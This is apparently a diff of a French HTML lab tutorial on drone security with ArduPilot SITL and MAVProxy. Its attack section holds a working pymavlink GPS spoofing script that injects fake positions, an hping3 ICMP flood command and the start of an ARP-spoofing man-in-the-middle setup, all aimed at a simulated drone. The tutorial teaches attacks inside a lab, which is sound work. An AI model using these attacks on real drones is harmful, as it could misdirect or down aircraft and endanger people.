-1   0   3   16  0 0 0 0   -35.3630 149.1655 10  1<br>
-2   0   3   16  0 0 0 0   -35.3635 149.1660 10  1<br>
-3   0   3   21  0 0 0 0   0         0        0   1<br>
-</div>
-        <div><span class="t-comment"># Charger la mission</span></div>
+        <div class="code-block" style="margin:8px 0">
+QGC WPL 110
+0   1   3   16   0 0 0 0   -35.3625  149.1650   10   1
+1   0   3   16   0 0 0 0   -35.3630  149.1655   10   1
+2   0   3   16   0 0 0 0   -35.3635  149.1660   10   1
+3   0   3   21   0 0 0 0    0         0          0   1
+        </div>
+        <div><span class="t-comment"># Charger et vérifier</span></div>
         <div><span class="t-prompt">GUIDED&gt; </span><span class="t-cmd">wp load mission.txt</span></div>
-        <br>
-        <div><span class="t-comment"># Vérifier la mission</span></div>
         <div><span class="t-prompt">GUIDED&gt; </span><span class="t-cmd">wp list</span></div>
         <br>
-        <div><span class="t-comment"># Démarrer la mission</span></div>
+        <div><span class="t-comment"># Lancer la mission</span></div>
         <div><span class="t-prompt">GUIDED&gt; </span><span class="t-cmd">mode AUTO</span></div>
-        <div><span class="t-out">Got COMMAND_ACK: DO_SET_MODE: ACCEPTED</span></div>
-        <div><span class="t-out">AUTO&gt; Mode AUTO</span></div>
-        <br>
         <div><span class="t-prompt">AUTO&gt; </span><span class="t-cmd">arm throttle</span></div>
-        <br>
-        <div><span class="t-comment"># Surveiller la mission en cours</span></div>
         <div><span class="t-prompt">AUTO&gt; </span><span class="t-cmd">watch MISSION_CURRENT</span></div>
         <div><span class="t-out">&lt; MISSION_CURRENT {seq: 1, total: 3, mission_state: 3, mission_mode: 1}</span></div>
       </div>
@@ -1946,272 +1679,77 @@ QGC WPL 110<br>
 
     <img src="images/img7.png" alt="Acoustic spoofing diagram" class="img">
     <img src="images/img8.png" alt="Acoustic spoofing diagram" class="img">
+    <div class="img-caption">Fig. 7-8 — Chargement de la mission et suivi dans la console</div>
+
     <img src="images/img9.png" alt="Acoustic spoofing diagram" class="img">
     <img src="images/img10.png" alt="Acoustic spoofing diagram" class="img">
+    <div class="img-caption">Fig. 9-10 — Visualisation de la mission sur la carte et exécution</div>
 
-    <h4 class="sub2">Méthode 2 : Création de mission via MAP </h4>
-    
-<div style="border: 1px solid var(--border); background: #020a0a; border-radius:2px; overflow:hidden; margin:20px 0">
-  
-  <div style="background: var(--teal-dark); padding:8px 16px; font-family:var(--mono); font-size:10px; color:var(--teal-light); letter-spacing:1px">
-     MAP
-  </div>
-
-  <div class="heartbeat-row">
-    <span class="dir">&gt;</span>
-    <span class="key">Ouvrir MAP</span>
-  </div>
-
-  <div class="heartbeat-row">
-    <span class="dir">&gt;</span>
-    <span class="key">Clic droit</span>
-  </div>
-
-  <div class="heartbeat-row">
-    <span class="dir">&gt;</span>
-    <span class="key">Mission | Draw</span>
-    <span class="annotation">→ activer le mode dessin de mission</span>
-  </div>
-
-  <div class="heartbeat-row">
-    <span class="dir">&gt;</span>
-    <span class="key">Clic sur la carte</span>
-    <span class="annotation">→ ajouter Waypoint 1 (point de départ)</span>
-    <span class="annotation">→ ajouter Waypoint 2</span>
-    <span class="annotation">→ ajouter Waypoint 3 (et ainsi de suite)</span>
-  </div>
-
-  <div class="heartbeat-row">
-    <span class="dir">&gt;</span>
-    <span class="key">Clic droit</span>
-    <span class="annotation">→ terminer la création de mission</span>
-  </div>
-
-  <div class="heartbeat-row">
-    <span class="dir">&gt;</span>
-    <span class="key">Mission | Loop</span>
-    <span class="annotation">→ boucle la mission en continu</span>
-  </div>
-
-  <div class="heartbeat-row">
-    <span class="dir">&gt;</span>
-    <span class="key">Mission | Stop</span>
-    <span class="annotation">→ arrêter la mission</span>
-  </div>
-
-</div>
-    <img src="images/img11.png" alt="Acoustic spoofing diagram" class="img">
-
-   <div class="terminal">
-      <div class="terminal-bar">
-        <span class="terminal-dot" style="background:#e05555"></span>
-        <span class="terminal-dot" style="background:#f0c040"></span>
-        <span class="terminal-dot" style="background:#4fd1d1"></span>
-        &nbsp; MAVProxy
+    <h4 class="sub2">Méthode 2 — Tracé sur la carte</h4>
+    <div style="border:1px solid var(--border); background:#020a0a; border-radius:2px; overflow:hidden; margin:16px 0">
+      <div style="background:var(--teal-dark); padding:8px 16px; font-family:var(--mono); font-size:10px; color:var(--teal-light); letter-spacing:1px">
+        Procédure — Mission via carte MAVProxy
       </div>
-      <div class="terminal-body">
-        <div><span class="t-prompt">GUIDED&gt; </span><span class="t-cmd">wp list</span></div>
-        <div><span class="t-prompt">GUIDED&gt; </span><span class="t-cmd">mode AUTO</span></div>
+      <div class="heartbeat-row">
+        <span class="dir">1.</span>
+        <span class="key">Ouvrir la fenêtre MAP</span>
+        <span class="annotation">La fenêtre Map de MAVProxy</span>
       </div>
-   </div>
-    
-    <img src="images/img12.png" alt="Acoustic spoofing diagram" class="img">
-    <img src="images/img13.png" alt="Acoustic spoofing diagram" class="img">
-
-  <div class="alert alert-warn">
-  <strong>⚠ Réinitialisation complète (SITL / MAVProxy)</strong><br>
-
-  <span class="comment"># 1. Arrêter tous les processus</span><br>
-  pkill -f arducopter 2&gt;/dev/null<br>
-  pkill -f mavproxy 2&gt;/dev/null<br><br>
-
-  <span class="comment"># 2. Supprimer la mémoire (EEPROM)</span><br>
-  cd ~/ardupilot/ArduCopter<br>
-  rm -f eeprom.bin<br><br>
-
-  <span class="comment"># 3. Supprimer les paramètres corrompus</span><br>
-  rm -f ~/ardupilot/build/sitl/tmp/default_params.parm<br><br>
-
-  <span class="comment">→ Cette procédure permet de remettre l’environnement à l’état initial en supprimant les configurations persistantes.</span>
-  </div>
-
-
-    <h3 class="subsection">Étape 6 — : Simulation d'attaque</h3>
-
-    <div class="two-col">
-      <div class="info-box">
-        <div class="ib-title">Faiblesses Fondamentales</div>
-        <ul class="styled">
-          <li><span class="tag-red">Pas chiffré</span> par défaut</li>
-          <li><span class="tag-red">Pas authentifié</span></li>
-          <li>Basé sur <span class="tag-red">UDP ouvert</span></li>
-        </ul>
+      <div class="heartbeat-row">
+        <span class="dir">2.</span>
+        <span class="key">Clic droit → Mission | Draw</span>
+        <span class="annotation">Active le mode dessin</span>
       </div>
-      <div class="info-box">
-        <div class="ib-title">Types d'Attaques Possibles</div>
-        <ul class="styled">
-          <li><span class="tag-red">Interception</span> : voir les messages MAVLink (HEARTBEAT, GPS…)</li>
-          <li><span class="tag-red">Spoofing</span> : faux GPS → changer position · faux GCS → envoyer commandes</li>
-          <li><span class="tag-red">Injection</span> : ARM/DISARM · SET_MODE · NAV_TAKEOFF</li>
-          <li><span class="tag-red">Replay</span> : réutiliser des messages capturés</li>
-        </ul>
+      <div class="heartbeat-row">
+        <span class="dir">3.</span>
+        <span class="key">Clic gauche sur la carte</span>
+        <span class="annotation">Place les waypoints un par un</span>
+      </div>
+      <div class="heartbeat-row">
+        <span class="dir">4.</span>
+        <span class="key">Clic droit → Mission | Stop ou Loop</span>
+        <span class="annotation">Termine ou boucle la mission</span>
+      </div>
+      <div class="heartbeat-row">
+        <span class="dir">5.</span>
+        <span class="key">wp list ; mode AUTO ; arm throttle</span>
+        <span class="annotation">Vérifie, bascule en AUTO, et démarre</span>
       </div>
     </div>
 
-    <div class="terminal" style="margin-top:24px">
-      <div class="terminal-bar">
-        <span class="terminal-dot" style="background:#e05555"></span>
-        <span class="terminal-dot" style="background:#f0c040"></span>
-        <span class="terminal-dot" style="background:#4fd1d1"></span>
-        &nbsp; Python — Réception d'un message GPS_RAW_INT via pymavlink
-      </div>
-      <div class="terminal-body">
-        <div><span class="t-comment">>>> # Dans le terminal Python (pymavlink)</span></div>
-        <div><span class="t-prompt">>>> </span><span class="t-cmd">from pymavlink import mavutil</span></div>
-        <div><span class="t-prompt">>>> </span><span class="t-cmd">master = mavutil.mavlink_connection('udp:127.0.0.1:14550')</span></div>
-        <div><span class="t-prompt">>>> </span><span class="t-cmd">msg = mav.recv_match(type='GPS_RAW_INT', blocking=True)</span></div>
-        <div><span class="t-prompt">>>> </span><span class="t-cmd">print(msg)</span></div>
-        <div><span class="t-out">GPS_RAW_INT {time_usec: 7599963000, fix_type: 6,</span></div>
-        <div><span class="t-out">&nbsp;&nbsp;lat: -353629919, lon: 1491642244, alt: 587120,</span></div>
-        <div><span class="t-out">&nbsp;&nbsp;eph: 121, epv: 200, vel: 0, cog: 31903,</span></div>
-        <div><span class="t-out">&nbsp;&nbsp;satellites_visible: 10, alt_ellipsoid: 587120,</span></div>
-        <div><span class="t-out">&nbsp;&nbsp;h_acc: 300, v_acc: 300, vel_acc: 0, hdg_acc: 0, yaw: 0}</span></div>
+    <img src="images/img11.png" alt="Tracé de mission sur la carte" class="img">
+    <div class="img-caption">Fig. 11 — Mission dessinée à la souris dans MAVProxy</div>
+
+     <img src="images/img13.png" alt="Acoustic spoofing diagram" class="img">
+    <div class="img-caption">Fig. 12 — Le drone suit la mission tracée</div>
+
+    <div class="alert alert-warn">
+      <strong>Réinitialiser SITL en cas de problème</strong>
+      Si la configuration est corrompue, on peut tout remettre à zéro :
+      <div style="margin-top:8px; font-family:var(--mono); font-size:11px">
+        pkill -f arducopter ; pkill -f mavproxy<br>
+        cd ~/ardupilot/ArduCopter &amp;&amp; rm -f eeprom.bin<br>
+        rm -f ~/ardupilot/build/sitl/tmp/default_params.parm
       </div>
     </div>
 
-  <h4 class="sub2">Scénario d’attaque : GPS Spoofing sur UAV </h4>
-    <div class="alert alert-info" style="margin-top:12px">
-      <strong>Objectif de l’attaque — GPS Spoofing UAV</strong>
-      Faire croire au drone qu’il est dans une fausse position afin de :
-      <br>• modifier sa trajectoire
-      <br>• le détourner de sa mission
-      <br>• provoquer une instabilité du système
-
-      <br><br>
-      <strong>Source :</strong>
-      https://peer.asee.org/gps-spoofing-on-uav-simulation-using-ardupilot.pdf
-    </div>
-
-    <p class="prose">D’abord, on crée un script d’attaque qui génère et envoie en continu des positions GPS falsifiées en suivant une trajectoire circulaire afin de simuler un scénario de GPS spoofing sur le drone.
-</p>
-
-      <div class="terminal">
-      <div class="terminal-bar">
-        <span class="terminal-dot" style="background:#e05555"></span>
-        <span class="terminal-dot" style="background:#f0c040"></span>
-        <span class="terminal-dot" style="background:#4fd1d1"></span>
-        &nbsp; Terminal 1 - Attaque
-      </div>
-      <div class="terminal-body">
-        <div><span class="t-prompt">$ </span><span class="t-cmd">mkdir Attaques</span></div>
-        <div><span class="t-prompt">$ </span><span class="t-cmd">cd Attaques</span></div>
-        <div><span class="t-prompt">$ </span><span class="t-cmd">nano gps_spoofing.py</span></div>
-        <div class="code-block">
-GPS SPOOFING - Cercle autour de Canberra {<br>
-&nbsp; import math <span class="comment">// bibliothèque mathématique</span><br>
-&nbsp; import time <span class="comment">// gestion du temps</span><br>
-&nbsp; from pymavlink import mavutil <span class="comment">// interface MAVLink</span><br><br>
-
-&nbsp; master = mavutil.mavlink_connection('udp:127.0.0.1:14551') <span class="comment">// connexion au simulateur drone</span><br>
-&nbsp; master.wait_heartbeat() <span class="comment">// attente de connexion active</span><br><br>
-
-&nbsp; center_lat = -353632621 <span class="comment">// latitude centre (Canberra)</span><br>
-&nbsp; center_lon = 1491652374 <span class="comment">// longitude centre (Canberra)</span><br>
-&nbsp; radius = 50000 <span class="comment">// rayon du cercle (~500 m)</span><br>
-&nbsp; altitude = 30.0 <span class="comment">// altitude constante</span><br>
-&nbsp; angle = 0 <span class="comment">// angle initial</span><br><br>
-
-&nbsp; while True: <span class="comment">// boucle d’attaque continue</span><br>
-&nbsp;&nbsp;&nbsp; spoofed_lat = int(center_lat + radius * cos(angle)) <span class="comment">// calcul latitude circulaire</span><br>
-&nbsp;&nbsp;&nbsp; spoofed_lon = int(center_lon + radius * sin(angle)) <span class="comment">// calcul longitude circulaire</span><br><br>
-
-&nbsp;&nbsp;&nbsp; master.mav.gps_input_send(<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0, 0, 0, 0, 0, 3,<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; spoofed_lat, spoofed_lon, altitude,<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 255<br>
-&nbsp;&nbsp;&nbsp; ) <span class="comment">// injection GPS spoofé</span><br><br>
-
-&nbsp;&nbsp;&nbsp; print("Angle:", angle, "Lat:", spoofed_lat/1e7, "Lon:", spoofed_lon/1e7) <span class="comment">// affichage debug</span><br><br>
-
-&nbsp;&nbsp;&nbsp; angle += 10 <span class="comment">// progression du cercle</span><br>
-&nbsp;&nbsp;&nbsp; if angle >= 360: angle = 0 <span class="comment">// reset angle</span><br>
-&nbsp;&nbsp;&nbsp; time.sleep(0.5) <span class="comment">// délai entre envois</span><br>
-}
-      </div>
-    </div>  
-  </div>
-    
-
-
-
- <p class="prose">Puis on configure MAVProxy dans un second terminal pour relayer la communication du drone en redirigeant le flux MAVLink du port 14550 vers le port 14551 afin de permettre l’interception et la manipulation des messages.
-</p>
-
-      <div class="terminal">
-      <div class="terminal-bar">
-        <span class="terminal-dot" style="background:#e05555"></span>
-        <span class="terminal-dot" style="background:#f0c040"></span>
-        <span class="terminal-dot" style="background:#4fd1d1"></span>
-        &nbsp; Terminal 2 - MAVProxy
-      </div>
-      <div class="terminal-body">
-        <div><span class="t-prompt">$ </span><span class="t-cmd">mavproxy.py --master=127.0.0.1:14550 --out=127.0.0.1:14551</span></div>
-    </div>  
-  </div>
-    
-
- <p class="prose">Dans le terminal SITL, on configure le drone en mode GUIDED, on l’arme, on le fait décoller et on ajuste les paramètres GPS nécessaires pour préparer le scénario de simulation.</p>
-
-      <div class="terminal">
-      <div class="terminal-bar">
-        <span class="terminal-dot" style="background:#e05555"></span>
-        <span class="terminal-dot" style="background:#f0c040"></span>
-        <span class="terminal-dot" style="background:#4fd1d1"></span>
-        &nbsp; Terminal 3 - SITL
-      </div>
-      <div class="terminal-body">
-        <div><span class="t-prompt">&gt; </span><span class="t-cmd">mode guided</span></div>
-        <div><span class="t-prompt">&gt; </span><span class="t-cmd">arm throttle</span></div>
-        <div><span class="t-prompt">&gt; </span><span class="t-cmd">takeoff 40</span></div>
-        <div><span class="t-prompt">&gt; </span><span class="t-cmd">param set GPS1_TYPE 14</span></div>
-    </div>  
-  </div>
-      <div class="alert alert-warn">
-      <strong>⚠ GPS1_TYPE 14</strong>
-      Indique au système d’accepter une source GPS particulière, souvent utilisée dans un contexte de simulation ou de réception de données externes via MAVLink.
-    </div>
-  
- <p class="prose">Finalement, on lance l'attaque.</p>
-
-      <div class="terminal">
-      <div class="terminal-bar">
-        <span class="terminal-dot" style="background:#e05555"></span>
-        <span class="terminal-dot" style="background:#f0c040"></span>
-        <span class="terminal-dot" style="background:#4fd1d1"></span>
-        &nbsp; Terminal 1 - Attaque
-      </div>
-      <div class="terminal-body">
-        <div><span class="t-prompt">$ </span><span class="t-cmd">python3 gps_spoofing.py</span></div>
-    </div>  
-  </div>
-
-    <img src="images/img14.png" alt="Acoustic spoofing diagram" class="img">
-
-    <h3 class="subsection">Récapitulatif des Commandes Clés</h3>
+    <!-- Récap commandes -->
+    <h3 class="subsection">Récapitulatif des commandes</h3>
     <div style="overflow-x:auto">
       <table class="data-table">
         <thead>
-          <tr><th>Commande MAVProxy</th><th>Description</th><th>Utilisation</th></tr>
+          <tr><th>Commande</th><th>Description</th><th>Utilisation</th></tr>
         </thead>
         <tbody>
-          <tr><td>watch HEARTBEAT</td><td>Surveillance du signal périodique système</td><td>État GCS et drone</td></tr>
-          <tr><td>watch GPS_RAW_INT</td><td>Données GPS brutes en temps réel</td><td>Navigation, position</td></tr>
-          <tr><td>watch ATTITUDE</td><td>Roll, pitch, yaw du drone</td><td>Stabilisation</td></tr>
-          <tr><td>watch MISSION_CURRENT</td><td>Waypoint en cours d'exécution</td><td>Suivi de mission</td></tr>
-          <tr><td>wp load mission.txt</td><td>Charger un plan de mission</td><td>Avant vol autonome</td></tr>
-          <tr><td>wp list</td><td>Vérifier les waypoints chargés</td><td>Validation mission</td></tr>
-          <tr><td>mode AUTO</td><td>Passer en mode vol autonome</td><td>Démarrage mission</td></tr>
+          <tr><td>watch HEARTBEAT</td><td>Surveille le pouls système</td><td>État GCS et drone</td></tr>
+          <tr><td>watch GPS_RAW_INT</td><td>Données GPS brutes</td><td>Navigation, position</td></tr>
+          <tr><td>watch ATTITUDE</td><td>Roll, pitch, yaw</td><td>Stabilisation</td></tr>
+          <tr><td>watch MISSION_CURRENT</td><td>Waypoint actuel</td><td>Suivi de mission</td></tr>
+          <tr><td>wp load mission.txt</td><td>Charger un plan</td><td>Avant vol autonome</td></tr>
+          <tr><td>wp list</td><td>Vérifier les waypoints</td><td>Validation</td></tr>
+          <tr><td>mode AUTO / GUIDED</td><td>Changer de mode</td><td>Démarrage / contrôle</td></tr>
           <tr><td>arm throttle</td><td>Armer les moteurs</td><td>Avant décollage</td></tr>
+          <tr><td>takeoff &lt;altitude&gt;</td><td>Décoller à une altitude</td><td>Mode GUIDED uniquement</td></tr>
         </tbody>
       </table>
     </div>
@@ -2219,12 +1757,1119 @@ GPS SPOOFING - Cercle autour de Canberra {<br>
   </div>
 </div><!-- end simulation -->
 
+<!-- ═══════════════════════════════════════════════════════════
+     PARTIE 3 — SCÉNARIOS D'ATTAQUE
+═══════════════════════════════════════════════════════════ -->
+<div id="attaques" class="section">
+
+  <div class="section-header">
+    <div class="section-eyebrow">Partie 03 — Attaques</div>
+    <h2 class="section-title">Trois scénarios d'attaque sur UAV</h2>
+    <p class="section-intro">
+      Maintenant que l'environnement est en place, on passe à l'offensive. Trois scénarios sont
+      étudiés : GPS spoofing par injection de positions falsifiées, déni de service par flooding,
+      et man-in-the-middle par ARP spoofing entre le drone et la GCS.
+    </p>
+  </div>
+
+  <div class="content-area">
+
+    <!-- Navigation rapide -->
+    <div class="step-nav" style="grid-template-columns: repeat(3, 1fr)">
+      <a class="step-nav-item" href="#atk-gps">
+        <div class="sn-num">01</div>
+        <div class="sn-label">Scénario</div>
+        <div class="sn-name">GPS Spoofing</div>
+      </a>
+      <a class="step-nav-item" href="#atk-dos">
+        <div class="sn-num">02</div>
+        <div class="sn-label">Scénario</div>
+        <div class="sn-name">Denial of Service</div>
+      </a>
+      <a class="step-nav-item" href="#atk-mitm">
+        <div class="sn-num">03</div>
+        <div class="sn-label">Scénario</div>
+        <div class="sn-name">Man-in-the-Middle</div>
+      </a>
+    </div>
+
+    <!-- Faiblesses fondamentales -->
+    <h3 class="subsection">Les faiblesses exploitées</h3>
+    <div class="two-col">
+      <div class="info-box">
+        <div class="ib-title">Conception MAVLink par défaut</div>
+        <ul class="styled">
+          <li><span class="tag-red">Pas chiffré</span> — tout passe en clair</li>
+          <li><span class="tag-red">Pas authentifié</span> — l'émetteur n'est pas vérifié</li>
+          <li>Basé sur <span class="tag-red">UDP ouvert</span></li>
+        </ul>
+      </div>
+      <div class="info-box">
+        <div class="ib-title">Conséquences pratiques</div>
+        <ul class="styled">
+          <li>Sniffing trivial avec Wireshark</li>
+          <li>Injection de commandes possible</li>
+          <li>Spoofing de la GCS ou du GPS</li>
+          <li>Replay attack sans détection</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- ═════════════════════════════════════════════════════
+         SCÉNARIO 1 : GPS SPOOFING
+    ═════════════════════════════════════════════════════ -->
+    <div class="attack-card" id="atk-gps">
+      <div class="at-label">Scénario 01</div>
+      <div class="at-title">GPS Spoofing sur UAV</div>
+      <div class="at-desc">
+        On fait croire au drone qu'il est ailleurs en injectant en continu des positions GPS
+        falsifiées suivant une trajectoire circulaire. Objectif : modifier sa trajectoire,
+        le détourner de sa mission, voire provoquer une instabilité.
+      </div>
+    </div>
+
+    <p class="prose">
+      Le script Python ouvre une connexion MAVLink vers le drone, attend le heartbeat, puis envoie
+      en boucle des positions GPS calculées sur un cercle de 500 m autour d'un point cible.
+    </p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Terminal 1 — Préparation du script
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">mkdir Attaques &amp;&amp; cd Attaques</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">nano gps_spoofing.py</span></div>
+      </div>
+    </div>
+
+    <div class="code-block">
+<span class="comment">#!/usr/bin/env python3</span>
+<span class="comment"># GPS SPOOFING — trajectoire circulaire autour de Canberra</span>
+import math, time
+from pymavlink import mavutil
+
+master = mavutil.mavlink_connection(<span class="str">'udp:127.0.0.1:14551'</span>)
+master.wait_heartbeat()
+print(<span class="str">"Connecté"</span>)
+
+center_lat = -353632621      <span class="comment"># lat × 1e7</span>
+center_lon =  1491652374     <span class="comment"># lon × 1e7</span>
+radius     = 50000           <span class="comment"># ~500 m</span>
+altitude   = 30.0
+angle      = 0
+
+while True:
+    spoofed_lat = int(center_lat + radius * math.cos(math.radians(angle)))
+    spoofed_lon = int(center_lon + radius * math.sin(math.radians(angle)))
+
+    master.mav.gps_input_send(
+        0, 0, 0, 0, 0, 3,
+        spoofed_lat, spoofed_lon, altitude,
+        0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 255
+    )
+    print(f<span class="str">"Angle: {angle:3d}° | Lat: {spoofed_lat/1e7:.6f} | Lon: {spoofed_lon/1e7:.6f}"</span>)
+
+    angle = (angle + 10) % 360
+    time.sleep(0.5)
+    </div>
+
+    <p class="prose">
+      On lance ensuite MAVProxy pour relayer le flux 14550 vers 14551 (port d'écoute du script),
+      puis on prépare le drone et on déclenche l'attaque.
+    </p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Terminal 2 — MAVProxy relais
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">mavproxy.py --master=127.0.0.1:14550 --out=127.0.0.1:14551</span></div>
+      </div>
+    </div>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Terminal 3 — SITL (préparation du drone)
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">mode GUIDED</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">arm throttle</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">takeoff 40</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">param set GPS1_TYPE 14</span></div>
+      </div>
+    </div>
+
+    <div class="alert alert-warn">
+      <strong>Paramètre GPS1_TYPE = 14</strong>
+      Ce paramètre indique à ArduPilot d'accepter une source GPS particulière via MAVLink (messages
+      <code>GPS_INPUT</code> ou <code>HIL_GPS</code>). C'est ce qui permet au script d'injecter ses
+      propres données dans le filtre EKF.
+    </div>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Terminal 1 — Lancer l'attaque
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">python3 gps_spoofing.py</span></div>
+      </div>
+    </div>
+
+    <img src="images/img14.png" alt="Effet du GPS spoofing" class="img">
+    <div class="img-caption">Fig. 14 — Le drone suit la position spoofée au lieu de la position réelle</div>
+
+    <!-- ═════════════════════════════════════════════════════
+         SCÉNARIO 2 : DOS
+    ═════════════════════════════════════════════════════ -->
+    <div class="attack-card" id="atk-dos">
+      <div class="at-label">Scénario 02</div>
+      <div class="at-title">Déni de service (DoS)</div>
+      <div class="at-desc">
+        En noyant l'hôte sous un flood de paquets ICMP, on sature sa pile réseau et son CPU.
+        Conséquence sur le drone simulé : la communication GCS ↔ UAV décroche, le fail-safe se
+        déclenche, et la mission s'interrompt.
+      </div>
+    </div>
+
+    <p class="prose">
+      <code>hping3</code> est un outil de génération de paquets réseau. L'option <code>-1</code>
+      utilise ICMP et <code>--flood</code> envoie à pleine vitesse, sans attendre de réponse.
+    </p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Terminal — Flood ICMP sur localhost
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">sudo hping3 -1 --flood 127.0.0.1</span></div>
+        <br>
+        <div><span class="t-comment"># -1        : protocole ICMP (ping)</span></div>
+        <div><span class="t-comment"># --flood   : envoi à pleine vitesse, sans attente</span></div>
+        <div><span class="t-comment"># 127.0.0.1 : la cible (ici notre simulateur local)</span></div>
+      </div>
+    </div>
+
+    <div class="alert alert-info">
+      <strong>Effet observé</strong>
+      Les paquets MAVLink légitimes sont noyés dans le flood, la GCS perd la liaison, et le drone
+      passe en fail-safe. En condition réelle, c'est typiquement le retour automatique au point de
+      départ (RTL) ou un atterrissage d'urgence qui se déclenche.
+    </div>
+
+    <!-- ═════════════════════════════════════════════════════
+         SCÉNARIO 3 : MITM
+    ═════════════════════════════════════════════════════ -->
+    <div class="attack-card" id="atk-mitm">
+      <div class="at-label">Scénario 03</div>
+      <div class="at-title">Man-in-the-Middle (ARP Spoofing)</div>
+      <div class="at-desc">
+        On s'intercale entre le drone (ArduCopter) et la GCS (QGroundControl) sur le réseau local.
+        Kali envoie de fausses réponses ARP aux deux machines pour faire passer ses paquets par
+        elle-même , elle voit tout, et peut modifier ou injecter à volonté.
+      </div>
+    </div>
+
+    <!-- ── Création des 3 machines virtuelles ── -->
+    <h4 class="sub2">Étape 0 — Créer les 3 machines virtuelles (VirtualBox)</h4>
+    <p class="prose">
+      Le scénario repose sur <strong>trois machines virtuelles</strong> isolées sur un même réseau
+      privé. L'adaptateur <strong>Host-Only</strong> de VirtualBox est le choix idéal : il crée un
+      réseau interne entre les VMs et l'hôte, sans accès Internet, ce qui correspond exactement à un
+      réseau de contrôle de drone fermé.
+    </p>
+
+    <div class="alert alert-info">
+      <strong>Pourquoi Host-Only ?</strong> — Les adaptateurs NAT ou Bridge exposent les VMs à
+      l'extérieur. Host-Only crée un segment <code>192.168.56.0/24</code> totalement isolé :
+      parfait pour rejouer l'attaque sans risque et sans bruit réseau parasite.
+    </div>
+
+    <!-- Tableau des 3 machines -->
+    <table style="width:100%;border-collapse:collapse;margin:24px 0;font-family:var(--mono);font-size:13px">
+      <thead>
+        <tr style="background:var(--card2);color:var(--accent)">
+          <th style="padding:10px 14px;text-align:left;border-bottom:1px solid var(--border)">#</th>
+          <th style="padding:10px 14px;text-align:left;border-bottom:1px solid var(--border)">Rôle</th>
+          <th style="padding:10px 14px;text-align:left;border-bottom:1px solid var(--border)">OS / Logiciel</th>
+          <th style="padding:10px 14px;text-align:left;border-bottom:1px solid var(--border)">IP Host-Only</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr style="background:var(--card)">
+          <td style="padding:9px 14px;border-bottom:1px solid var(--border)">VM 1</td>
+          <td style="padding:9px 14px;border-bottom:1px solid var(--border)">Drone simulé</td>
+          <td style="padding:9px 14px;border-bottom:1px solid var(--border)">Ubuntu 22.04 + ArduPilot SITL</td>
+          <td style="padding:9px 14px;border-bottom:1px solid var(--border);color:var(--teal-light)">192.168.56.101</td>
+        </tr>
+        <tr style="background:var(--card2)">
+          <td style="padding:9px 14px;border-bottom:1px solid var(--border)">VM 2</td>
+          <td style="padding:9px 14px;border-bottom:1px solid var(--border)">Station de contrôle (GCS)</td>
+          <td style="padding:9px 14px;border-bottom:1px solid var(--border)">Ubuntu 22.04 + QGroundControl</td>
+          <td style="padding:9px 14px;border-bottom:1px solid var(--border);color:var(--teal-light)">192.168.56.102</td>
+        </tr>
+        <tr style="background:var(--card)">
+          <td style="padding:9px 14px">VM 3</td>
+          <td style="padding:9px 14px">Attaquant</td>
+          <td style="padding:9px 14px">Kali Linux</td>
+          <td style="padding:9px 14px;color:#e05555">192.168.56.3</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <!-- Étapes VirtualBox -->
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; VirtualBox — Créer le réseau Host-Only et lier les 3 VMs
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-comment"># ── 1. Créer le réseau Host-Only dans VirtualBox ──</span></div>
+        <div><span class="t-out">→ Fichier  &gt;  Gestionnaire de réseau hôte  &gt;  Créer</span></div>
+        <div><span class="t-out">→ Nom : vboxnet0</span></div>
+        <div><span class="t-out">→ Adresse IPv4   : 192.168.56.1   (IP de l'hôte sur ce réseau)</span></div>
+        <div><span class="t-out">→ Masque réseau  : 255.255.255.0</span></div>
+        <div><span class="t-out">→ Serveur DHCP   : désactivé  (IPs fixes sur chaque VM)</span></div>
+        <br>
+        <div><span class="t-comment"># ── 2. Configurer chaque VM (répéter pour les 3) ──</span></div>
+        <div><span class="t-out">→ Sélectionner la VM  &gt;  Configuration  &gt;  Réseau</span></div>
+        <div><span class="t-out">→ Adaptateur 1  : NAT          (accès Internet pour les mises à jour)</span></div>
